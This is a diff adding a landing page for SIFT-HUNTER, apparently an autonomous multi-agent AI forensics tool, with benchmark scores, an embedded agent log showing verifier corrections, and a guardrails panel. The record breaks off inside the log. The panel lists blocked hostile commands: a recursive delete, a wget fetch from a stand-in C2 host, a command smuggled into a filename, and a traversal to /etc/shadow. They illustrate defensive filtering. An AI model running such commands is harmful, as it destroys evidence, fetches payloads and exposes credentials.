@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>SIFT-HUNTER - Autonomous AI Incident Response</title>
+<meta name="description" content="An autonomous AI agent that does digital forensics and catches its own hallucinations. Measured 100% precision / 86% recall on the canonical zeus.vmem and cridex.vmem samples."/>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='42' fill='none' stroke='%233fe6d0' stroke-width='7'/%3E%3Ccircle cx='50' cy='50' r='6' fill='%233fe6d0'/%3E%3Cpath d='M50 4v20M50 76v20M4 50h20M76 50h20' stroke='%233fe6d0' stroke-width='7'/%3E%3C/svg%3E"/>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<style>
+  :root{
+    --ink:#05070d; --panel:#0b0f18; --panel2:#0e1320; --line:#1b2436;
+    --text:#eef2f8; --muted:#93a0b5; --dim:#5d6b82;
+    --cyan:#3fe6d0; --green:#46e08a; --amber:#f5b14c; --red:#ff6b6b;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--ink); color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;
+    line-height:1.6; -webkit-font-smoothing:antialiased;
+    background-image:
+      radial-gradient(900px 500px at 85% -5%, rgba(63,230,208,.10), transparent 60%),
+      radial-gradient(800px 520px at -5% 8%, rgba(54,110,224,.10), transparent 60%);
+    background-attachment:fixed;
+  }
+  .wrap{max-width:1060px;margin:0 auto;padding:0 24px}
+  code,.mono{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace}
+  a{color:var(--cyan);text-decoration:none}
+  a:hover{text-decoration:underline}
+
+  /* nav */
+  nav{position:sticky;top:0;z-index:20;backdrop-filter:blur(10px);
+    background:rgba(5,7,13,.72);border-bottom:1px solid var(--line)}
+  nav .wrap{display:flex;align-items:center;gap:20px;height:58px}
+  nav .brand{font-weight:800;letter-spacing:-.02em}
+  nav .brand .c{color:var(--cyan)}
+  nav .links{margin-left:auto;display:flex;gap:22px;font-size:14px}
+  nav .links a{color:var(--muted)} nav .links a:hover{color:var(--text);text-decoration:none}
+  nav .repo{border:1px solid rgba(63,230,208,.4);border-radius:999px;padding:6px 14px;color:var(--cyan);font-size:13px}
+  @media(max-width:740px){nav .links{display:none}}
+
+  /* hero */
+  header.hero{padding:64px 0 28px}
+  .eyebrow{font-family:ui-monospace,monospace;font-size:13px;letter-spacing:.28em;text-transform:uppercase;color:var(--muted);display:flex;gap:12px;align-items:center}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 12px var(--green)}
+  h1.title{font-size:clamp(44px,8vw,84px);line-height:.95;letter-spacing:-.03em;font-weight:800;margin:18px 0 14px}
+  h1.title .c{color:var(--cyan)}
+  .lede{font-size:clamp(18px,2.4vw,23px);color:#cdd6e4;max-width:760px}
+  .lede b{color:#fff}
+  .chips{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
+  .chip{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.012));border:1px solid var(--line);border-radius:14px;padding:14px 18px;min-width:140px}
+  .chip .n{font-size:26px;font-weight:800;letter-spacing:-.02em}
+  .chip .n.cyan{color:var(--cyan)} .chip .n.green{color:var(--green)}
+  .chip .l{font-size:13px;color:var(--muted);margin-top:2px}
+  .cta{display:flex;gap:12px;margin-top:30px;flex-wrap:wrap}
+  .btn{border-radius:12px;padding:12px 20px;font-weight:700;font-size:15px;border:1px solid var(--line)}
+  .btn.primary{background:var(--cyan);color:#04201c;border-color:var(--cyan)}
+  .btn.ghost{background:transparent;color:var(--text)}
+
+  /* sections */
+  section{padding:54px 0;border-top:1px solid var(--line)}
+  .kicker{font-family:ui-monospace,monospace;font-size:12px;letter-spacing:.24em;text-transform:uppercase;color:var(--cyan)}
+  h2{font-size:clamp(28px,4vw,40px);line-height:1.05;letter-spacing:-.02em;font-weight:800;margin:8px 0 10px}
+  .sub{color:var(--muted);max-width:760px;margin-bottom:26px}
+
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px}
+  .grid2{display:grid;grid-template-columns:1.3fr 1fr;gap:18px}
+  @media(max-width:820px){.grid2{grid-template-columns:1fr}}
+
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:11px 12px;border-bottom:1px solid var(--line)}
+  th{color:var(--muted);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase}
+  td.mono{font-variant-numeric:tabular-nums}
+  .ok{color:var(--green);font-weight:700}
+  .tag{display:inline-block;font-family:ui-monospace,monospace;font-size:12px;border:1px solid var(--line);border-radius:6px;padding:2px 7px;color:var(--cyan);background:rgba(63,230,208,.06)}
+
+  .bars{display:flex;flex-direction:column;gap:12px}
+  .bar{display:grid;grid-template-columns:120px 1fr 56px;align-items:center;gap:12px;font-size:14px}
+  .bar .track{height:9px;border-radius:6px;background:#16203100;border:1px solid var(--line);overflow:hidden}
+  .bar .fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--green))}
+  .bar .pct{text-align:right;color:var(--muted);font-variant-numeric:tabular-nums}
+
+  .flow{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin:6px 0 18px}
+  .node{border:1px solid var(--line);border-radius:10px;padding:8px 12px;font-size:13px;font-weight:600;background:var(--panel2)}
+  .node.star{border-color:rgba(63,230,208,.55);color:var(--cyan);box-shadow:0 0 18px rgba(63,230,208,.12)}
+  .arrow{color:var(--dim)}
+  .loop{font-family:ui-monospace,monospace;font-size:12px;color:var(--amber);margin-left:4px}
+
+  .term{background:#070a11;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+  .term .head{display:flex;gap:7px;padding:11px 14px;border-bottom:1px solid var(--line);align-items:center}
+  .term .head .b{width:11px;height:11px;border-radius:50%;background:#28324a}
+  .term .head .t{margin-left:8px;font-family:ui-monospace,monospace;font-size:12px;color:var(--muted)}
+  .log{max-height:380px;overflow:auto;font-family:ui-monospace,monospace;font-size:12.5px;line-height:1.85;padding:12px 14px}
+  .log .row{display:grid;grid-template-columns:54px 110px 1fr;gap:10px;padding:2px 0}
+  .log .ts{color:var(--dim)} .log .ag{color:var(--cyan)}
+  .log .ac{color:#cdd6e4}
+  .log .row.c .ac{color:var(--amber);font-weight:700}
+  .log .row.v .ag{color:var(--green)}
+  .log .row.f .ag{color:var(--muted)}
+
+  .spot{border-left:3px solid var(--amber);background:var(--panel2);border-radius:0 14px 14px 0;padding:18px 22px;font-size:15px;color:#dbe3f0}
+  .spot .q{color:#fff}
+  .statrow{display:flex;flex-wrap:wrap;gap:22px;margin-top:16px}
+  .statrow .s .n{font-size:24px;font-weight:800;color:var(--cyan)}
+  .statrow .s .l{font-size:12px;color:var(--muted)}
+
+  /* report markdown */
+  .report{background:var(--panel);border:1px solid var(--line);border-radius:18px;max-height:620px;overflow:auto}
+  .report .md{padding:26px 30px;font-size:14.5px}
+  .report .md h1{font-size:24px;margin:0 0 4px} .report .md h2{font-size:18px;margin:24px 0 8px;color:var(--cyan);border:0;letter-spacing:0}
+  .report .md h3{font-size:15px;margin:18px 0 4px}
+  .report .md table{margin:10px 0} .report .md code{background:#0a0e17;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:12.5px}
+  .report .md pre{background:#070a11;border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px}
+  .report .md hr{border:0;border-top:1px solid var(--line);margin:18px 0}
+  .report .md a{color:var(--cyan)} .report .md blockquote{border-left:3px solid var(--line);padding-left:12px;color:var(--muted)}
+
+  .sec-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  @media(max-width:740px){.sec-grid{grid-template-columns:1fr}}
+  .checkline{display:flex;gap:10px;align-items:flex-start;font-family:ui-monospace,monospace;font-size:13px;padding:8px 0;border-bottom:1px solid var(--line)}
+  .checkline .v{font-weight:700}
+  .blocked{color:var(--red)} .allowed{color:var(--green)}
+
+  .custody{font-family:ui-monospace,monospace;font-size:12px}
+  .custody .row{display:grid;grid-template-columns:240px 1fr;gap:14px;padding:7px 0;border-bottom:1px solid var(--line)}
+  .custody .h{color:var(--dim);word-break:break-all}
+  @media(max-width:740px){.custody .row{grid-template-columns:1fr}}
+
+  footer{padding:44px 0;border-top:1px solid var(--line);color:var(--muted);font-size:14px}
+  footer .cmds{background:#070a11;border:1px solid var(--line);border-radius:12px;padding:14px 16px;font-family:ui-monospace,monospace;font-size:12.5px;color:#cdd6e4;margin:14px 0;white-space:pre;overflow:auto}
+</style>
+</head>
+<body>
+<nav><div class="wrap">
+  <span class="brand">SIFT<span class="c">-HUNTER</span></span>
+  <span class="links">
+    <a href="#eval">Evaluation</a>
+    <a href="#run">Inside a run</a>
+    <a href="#report">Report</a>
+    <a href="#security">Guardrails</a>
+  </span>
+  <a class="repo" href="https://github.com/svaka2000/SIFT-HUNTER" target="_blank" rel="noopener">GitHub</a>
+</div></nav>
+
+<header class="hero"><div class="wrap">
+  <div class="eyebrow"><span class="dot"></span> Autonomous Incident Response <span style="color:#39465c">/</span> SANS SIFT Workstation</div>
+  <h1 class="title">SIFT<span class="c">-HUNTER</span></h1>
+  <div class="lede">An autonomous AI agent that runs full digital forensics on disk and memory, and <b>catches its own hallucinations</b> before they reach the report.</div>
+  <div class="chips" id="chips"></div>
+  <div class="cta">
+    <a class="btn primary" href="#eval">See the measured proof</a>
+    <a class="btn ghost" href="#run">Watch a real run</a>
+  </div>
+</div></header>
+
+<section id="eval"><div class="wrap">
+  <div class="kicker">Measured, not claimed</div>
+  <h2>Evaluated on real malware memory</h2>
+  <p class="sub">Scored against the canonical Volatility samples every DFIR analyst knows, <b>zeus.vmem</b> and <b>cridex.vmem</b>, with publicly documented ground truth. The deterministic detection layer, no LLM and no API key required.</p>
+  <div class="grid2">
+    <div class="card"><table id="evalTable"></table></div>
+    <div class="card">
+      <div style="font-size:13px;color:var(--muted);margin-bottom:14px">Per-category recall</div>
+      <div class="bars" id="catBars"></div>
+    </div>
+  </div>
+</div></section>
+
+<section id="run"><div class="wrap">
+  <div class="kicker">The tiebreaker</div>
+  <h2>It corrects itself, on real evidence</h2>
+  <p class="sub">A Verifier agent re-checks every finding against the raw tool output. When it catches a claim the evidence does not support, it routes the finding back to be re-examined. Here is one real run.</p>
+  <div class="flow">
+    <span class="node">Triage</span><span class="arrow">&rarr;</span>
+    <span class="node">Disk</span><span class="arrow">&rarr;</span>
+    <span class="node">Memory</span><span class="arrow">&rarr;</span>
+    <span class="node">Correlator</span><span class="arrow">&rarr;</span>
+    <span class="node star">Verifier &#9733;</span><span class="arrow">&rarr;</span>
+    <span class="node">Reporter</span>
+    <span class="loop">&#8617; loops back on a bad finding</span>
+  </div>
+  <div class="spot">
+    <span class="q">"Per correction review, the Meterpreter/framework attribution is an inference and is not directly confirmed by tool output; the connection itself is confirmed. The type has been corrected from LATERAL_MOVEMENT to reflect the outbound C2 nature."</span>
+    <div style="color:var(--muted);font-size:13px;margin-top:8px">- the Verifier, downgrading an over-claimed finding in the committed report</div>
+    <div class="statrow" id="runStats"></div>
+  </div>
+  <div style="height:18px"></div>
+  <div class="term">
+    <div class="head"><span class="b"></span><span class="b"></span><span class="b"></span><span class="t">execution_log.jsonl &mdash; real timestamped agent audit trail</span></div>
+    <div class="log" id="log"></div>
+  </div>
+</div></section>
+
+<section id="report"><div class="wrap">
+  <div class="kicker">The output</div>
+  <h2>The incident report it produced</h2>
+  <p class="sub">A structured report with confidence levels, MITRE ATT&amp;CK mapping, an attack timeline, and a self-assessment. Verbatim from a real run.</p>
+  <div class="report"><div class="md" id="report"></div></div>
+</div></section>
+
+<section id="security"><div class="wrap">
+  <div class="kicker">Architectural, not a prompt</div>
+  <h2>Guardrails, tested for bypass</h2>
+  <p class="sub">Destructive and exfiltration actions are blocked in Python before any command runs. 20 adversarial bypass attempts, all refused.</p>
+  <div class="sec-grid">
+    <div class="card">
+      <div class="checkline"><span class="v blocked">BLOCKED</span><code>rm -rf /evidence</code></div>
+      <div class="checkline"><span class="v blocked">BLOCKED</span><code>wget http://c2/payload</code></div>
+      <div class="checkline"><span class="v blocked">BLOCKED</span><code>vol3 -f "mem.dmp; rm -rf /"</code></div>
+      <div class="checkline" style="border:0"><span class="v blocked">BLOCKED</span><code>../../etc/shadow</code></div>
+    </div>
+    <div class="card">
+      <div class="checkline"><span class="v allowed">ALLOWED</span><code>vol3 -f mem.dmp pslist</code></div>
+      <div class="checkline"><span class="v allowed">ALLOWED</span><code>MFTECmd -f $MFT.csv</code></div>
+      <div class="checkline" style="border:0;color:var(--muted)">allow-list + path validation + shell=False, enforced before execution</div>
+    </div>
+  </div>
+  <div style="height:24px"></div>
+  <div class="kicker">Forensic soundness</div>
+  <h2 style="font-size:26px">Chain of custody</h2>
+  <p class="sub">Every evidence file is SHA-256 hashed on each run, so a reviewer can prove nothing was altered.</p>
+  <div class="card custody" id="custody"></div>
+</div></section>
+
+<footer><div class="wrap">
+  <div style="font-weight:700;color:var(--text)">Reproduce everything &mdash; no API key needed:</div>
+  <div class="cmds">git clone https://github.com/svaka2000/SIFT-HUNTER &amp;&amp; cd SIFT-HUNTER &amp;&amp; pip install -e .
+python -m benchmarks.evaluate                 # 100% precision / 86% recall on zeus + cridex
+python -m benchmarks.hallucination_benchmark  # 93% catch / 0% false positives
+pytest tests/test_security_bypass.py          # 20 bypass attempts, all refused</div>
+  <div>SIFT-HUNTER &middot; SANS FIND EVIL! &middot; <a href="https://github.com/svaka2000/SIFT-HUNTER" target="_blank" rel="noopener">github.com/svaka2000/SIFT-HUNTER</a></div>
+</div></footer>
+
+<script>const DATA = {"eval": {"cases": [{"case_id": "case001", "source": "", "n_detections": 5, "true_positives": 5, "false_positives": 0, "iocs_total": 5, "iocs_found": 4, "iocs_missed": ["MSHTA LOLBin execution"], "metrics_all": {"precision": 1.0, "recall": 0.8, "f1": 0.889}, "recall_deterministic_scoped": 0.8, "mitre_found": ["T1036", "T1070.006", "T1071", "T1547.001"], "mitre_total": ["T1036", "T1070.006", "T1071", "T1218.005", "T1547.001"], "chain_of_custody_sha256": {"mft.csv": "2d5d2e9609cc51c22b10184b9f5fbdf1784b86910b0322e6b683cf0790cb26a8", "netscan.csv": "f4901e21cdb5d2ac1f207591477529575ba2e668bc50e3db93c9b8e4fb95ea38", "prefetch.csv": "59569e45ece2f52369d610f5b61bc9055a12049dc6f81ebcf39fbc489b2fe6ef", "pslist.csv": "6c99e3a38cd244d57bb72f6a7136266487ebce4f79db1eb5a260288af8a7310d", "registry.csv": "ddd0a57f3a8c7839d1548ba989340a514665125e2a571d4aaf26b43466d30dcd"}, "per_category": {"other": {"total": 5, "found": 4, "recall": 0.8}}}, {"case_id": "zeus-vmem", "source": "Volatility Foundation public memory sample \u2014 zeus.vmem", "n_detections": 4, "true_positives": 4, "false_positives": 0, "iocs_total": 5, "iocs_found": 4, "iocs_missed": ["zeus-firewall"], "metrics_all": {"precision": 1.0, "recall": 0.8, "f1": 0.889}, "recall_deterministic_scoped": 1.0, "mitre_found": ["T1055", "T1071", "T1547.004"], "mitre_total": ["T1055", "T1071", "T1547.004", "T1562.004"], "chain_of_custody_sha256": {"malfind.csv": "820f7aec4408321948c3eee52c4a0dcad67b3b9061ce7d373b894f585d8a8939", "netscan.csv": "acecc9f85b396207e4cb4770d31d03a7ad85d2275f85ee170f5ea9b0eb3673c5", "pslist.csv": "cc3376034e3c12104ed07f97dd372caeca2081d766bacb3123f488496ff35d6e", "registry.csv": "c81cf312f6c0286fefb71bae533d072fae6a3247f58b953c957d3f0729440b2a"}, "per_category": {"injection": {"total": 2, "found": 2, "recall": 1.0}, "c2": {"total": 1, "found": 1, "recall": 1.0}, "persistence": {"total": 1, "found": 1, "recall": 1.0}, "defense_evasion": {"total": 1, "found": 0, "recall": 0.0}}}, {"case_id": "cridex-vmem", "source": "Volatility Foundation public memory sample \u2014 cridex.vmem", "n_detections": 4, "true_positives": 4, "false_positives": 0, "iocs_total": 4, "iocs_found": 4, "iocs_missed": [], "metrics_all": {"precision": 1.0, "recall": 1.0, "f1": 1.0}, "recall_deterministic_scoped": 1.0, "mitre_found": ["T1055", "T1071"], "mitre_total": ["T1055", "T1071"], "chain_of_custody_sha256": {"malfind.csv": "6b6fad382b232e9d81cd21dfd3a90a3f052677f611287450b2007c526cb41e6c", "netscan.csv": "de84018bbb6d00889528772024555caa9a5a2c3d6caf3af64dbd5697d19ab824", "pslist.csv": "44b95012cbd55f36661b5bfafab25e9641c678a232bf68f9e50d9083ae549af6"}, "per_category": {"injection": {"total": 2, "found": 2, "recall": 1.0}, "c2": {"total": 2, "found": 2, "recall": 1.0}}}], "overall": {"cases_evaluated": 3, "total_iocs": 14, "iocs_found": 12, "detections": 13, "false_positives": 0, "precision": 1.0, "recall": 0.857, "f1": 0.923, "per_category": {"other": {"total": 5, "found": 4, "recall": 0.8}, "injection": {"total": 4, "found": 4, "recall": 1.0}, "c2": {"total": 3, "found": 3, "recall": 1.0}, "persistence": {"total": 1, "found": 1, "recall": 1.0}, "defense_evasion": {"total": 1, "found": 0, "recall": 0.0}}}}, "timeline": [{"t": 0.0, "agent": "orchestrator", "action": "ANALYSIS_START", "phase": "init", "iter": 0, "details": "Starting analysis of 3 evidence items"}, {"t": 0.0, "agent": "triage", "action": "PHASE_START", "phase": "triage", "iter": 0, "details": "Triaging 3 evidence items"}, {"t": 15.8, "agent": "triage", "action": "TRIAGE_COMPLETE", "phase": "triage", "iter": 0, "details": "Risk=HIGH OS=Windows Plan=5 steps"}, {"t": 15.8, "agent": "disk_analyst", "action": "PHASE_START", "phase": "disk", "iter": 1, "details": "Analyzing disk evidence. Corrections: 0"}, {"t": 15.8, "agent": "disk_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=mft_parser path=benchmarks/cases/case001/evidence/mft.csv excerpt=[{\"EntryNumber\": \"1334\", \"FileName\": \"svchost_helper.exe\", \"ParentPath\": \"C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\"}, {"t": 51.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=PERSISTENCE confidence=CONFIRMED"}, {"t": 51.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 51.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 51.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 51.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=POSSIBLE"}, {"t": 51.9, "agent": "disk_analyst", "action": "DISK_ANALYSIS_COMPLETE", "phase": "disk", "iter": 0, "details": "Produced 5 findings"}, {"t": 51.9, "agent": "memory_analyst", "action": "PHASE_START", "phase": "memory", "iter": 2, "details": "Analyzing memory evidence. Corrections: 0"}, {"t": 51.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/mft.csv excerpt=EntryNumber,FileName,ParentPath,FileSize,Created0x10,Created0x30,LastModified0x10,LastModified0x3"}, {"t": 51.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/registry.csv excerpt=KeyPath,ValueName,ValueData\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,WindowsHelper,C:\\U"}, {"t": 51.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/netscan.csv excerpt=Proto,LocalAddr,LocalPort,ForeignAddr,ForeignPort,State,PID,Owner\nTCPv4,192.168.1.50,49671,45"}, {"t": 89.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 89.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 89.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=COMMAND_AND_CONTROL confidence=CONFIRMED"}, {"t": 89.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=PROBABLE"}, {"t": 89.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 89.6, "agent": "memory_analyst", "action": "MEMORY_ANALYSIS_COMPLETE", "phase": "memory", "iter": 0, "details": "Produced 5 findings"}, {"t": 89.6, "agent": "correlator", "action": "PHASE_START", "phase": "correlation", "iter": 3, "details": "Correlating 10 findings"}, {"t": 139.9, "agent": "correlator", "action": "CORRELATION_COMPLETE", "phase": "correlation", "iter": 0, "details": "Timeline: 0 events, inconsistencies: 0"}, {"t": 139.9, "agent": "verifier", "action": "VERIFICATION_START", "phase": "verification", "iter": 4, "details": "Verifying 10 findings"}, {"t": 156.3, "agent": "verifier", "action": "VERIFICATION_COMPLETE", "phase": "verification", "iter": 4, "details": "Quality: PARTIAL | Approved: 4 | Corrections: 2"}, {"t": 156.3, "agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 4, "details": "The MITRE TTP T1071 (Application Layer Protocol / Command and Control) is included with 0.58 confidence in a finding about timestomping. This technique has no logical connection to"}, {"t": 156.3, "agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 4, "details": "The raw_evidence_excerpt references '_flags: [\"SUSPICIOUS_LOCATION: C:\\Users\\victim\\AppData\\Local\\Temp\\svchost_helper.exe\"]' but the actual tool output from mft_parser only shows '"}, {"t": 156.3, "agent": "disk_analyst", "action": "PHASE_START", "phase": "disk", "iter": 5, "details": "Analyzing disk evidence. Corrections: 2"}, {"t": 156.3, "agent": "disk_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=mft_parser path=benchmarks/cases/case001/evidence/mft.csv excerpt=[{\"EntryNumber\": \"1334\", \"FileName\": \"svchost_helper.exe\", \"ParentPath\": \"C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\"}, {"t": 192.3, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=PERSISTENCE confidence=CONFIRMED"}, {"t": 192.3, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 192.3, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=DEFENSE_EVASION confidence=POSSIBLE"}, {"t": 192.3, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 192.3, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=POSSIBLE"}, {"t": 192.3, "agent": "disk_analyst", "action": "DISK_ANALYSIS_COMPLETE", "phase": "disk", "iter": 0, "details": "Produced 5 findings"}, {"t": 192.3, "agent": "memory_analyst", "action": "PHASE_START", "phase": "memory", "iter": 6, "details": "Analyzing memory evidence. Corrections: 0"}, {"t": 192.3, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/mft.csv excerpt=EntryNumber,FileName,ParentPath,FileSize,Created0x10,Created0x30,LastModified0x10,LastModified0x3"}, {"t": 192.3, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/registry.csv excerpt=KeyPath,ValueName,ValueData\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,WindowsHelper,C:\\U"}, {"t": 192.3, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/netscan.csv excerpt=Proto,LocalAddr,LocalPort,ForeignAddr,ForeignPort,State,PID,Owner\nTCPv4,192.168.1.50,49671,45"}, {"t": 229.5, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 229.5, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 229.5, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=COMMAND_AND_CONTROL confidence=CONFIRMED"}, {"t": 229.5, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=POSSIBLE"}, {"t": 229.5, "agent": "memory_analyst", "action": "MEMORY_ANALYSIS_COMPLETE", "phase": "memory", "iter": 0, "details": "Produced 4 findings"}, {"t": 229.5, "agent": "correlator", "action": "PHASE_START", "phase": "correlation", "iter": 7, "details": "Correlating 12 findings"}, {"t": 279.3, "agent": "correlator", "action": "CORRELATION_COMPLETE", "phase": "correlation", "iter": 0, "details": "Timeline: 4 events, inconsistencies: 5"}, {"t": 279.3, "agent": "verifier", "action": "VERIFICATION_START", "phase": "verification", "iter": 8, "details": "Verifying 12 findings"}, {"t": 299.1, "agent": "verifier", "action": "VERIFICATION_COMPLETE", "phase": "verification", "iter": 8, "details": "Quality: PARTIAL | Approved: 2 | Corrections: 1"}, {"t": 299.1, "agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 8, "details": "The finding claims 'dual-source confirmation from both disk and memory eliminates the possibility of stale or residual network state entries' and references 'mem_002' as a corrobor"}, {"t": 299.1, "agent": "disk_analyst", "action": "PHASE_START", "phase": "disk", "iter": 9, "details": "Analyzing disk evidence. Corrections: 1"}, {"t": 299.1, "agent": "disk_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=mft_parser path=benchmarks/cases/case001/evidence/mft.csv excerpt=[{\"EntryNumber\": \"1334\", \"FileName\": \"svchost_helper.exe\", \"ParentPath\": \"C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\"}, {"t": 328.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 328.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=PERSISTENCE confidence=CONFIRMED"}, {"t": 328.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 328.9, "agent": "disk_analyst", "action": "finding_created", "phase": "disk", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=PROBABLE"}, {"t": 328.9, "agent": "disk_analyst", "action": "DISK_ANALYSIS_COMPLETE", "phase": "disk", "iter": 0, "details": "Produced 4 findings"}, {"t": 328.9, "agent": "memory_analyst", "action": "PHASE_START", "phase": "memory", "iter": 10, "details": "Analyzing memory evidence. Corrections: 0"}, {"t": 328.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/mft.csv excerpt=EntryNumber,FileName,ParentPath,FileSize,Created0x10,Created0x30,LastModified0x10,LastModified0x3"}, {"t": 328.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/registry.csv excerpt=KeyPath,ValueName,ValueData\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,WindowsHelper,C:\\U"}, {"t": 328.9, "agent": "memory_analyst", "action": "tool_call", "phase": null, "iter": null, "details": "tool=memory_artifact_reader path=benchmarks/cases/case001/evidence/netscan.csv excerpt=Proto,LocalAddr,LocalPort,ForeignAddr,ForeignPort,State,PID,Owner\nTCPv4,192.168.1.50,49671,45"}, {"t": 359.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=DEFENSE_EVASION confidence=CONFIRMED"}, {"t": 359.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=EXECUTION confidence=CONFIRMED"}, {"t": 359.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=COMMAND_AND_CONTROL confidence=CONFIRMED"}, {"t": 359.6, "agent": "memory_analyst", "action": "finding_created", "phase": "memory", "iter": null, "details": "type=LATERAL_MOVEMENT confidence=PROBABLE"}, {"t": 359.6, "agent": "memory_analyst", "action": "MEMORY_ANALYSIS_COMPLETE", "phase": "memory", "iter": 0, "details": "Produced 4 findings"}, {"t": 359.6, "agent": "correlator", "action": "PHASE_START", "phase": "correlation", "iter": 11, "details": "Correlating 14 findings"}, {"t": 411.6, "agent": "correlator", "action": "CORRELATION_COMPLETE", "phase": "correlation", "iter": 0, "details": "Timeline: 0 events, inconsistencies: 0"}, {"t": 411.6, "agent": "verifier", "action": "VERIFICATION_START", "phase": "verification", "iter": 12, "details": "Verifying 14 findings"}, {"t": 434.7, "agent": "verifier", "action": "VERIFICATION_COMPLETE", "phase": "verification", "iter": 12, "details": "Quality: FAIL | Approved: 1 | Corrections: 3"}, {"t": 434.7, "agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 12, "details": "Finding ID 'disk_001' appears TWICE in the findings list \u2014 once as the first entry and again as the third entry. These are duplicate findings describing the same artifact (svchost_"}, {"t": 434.7, 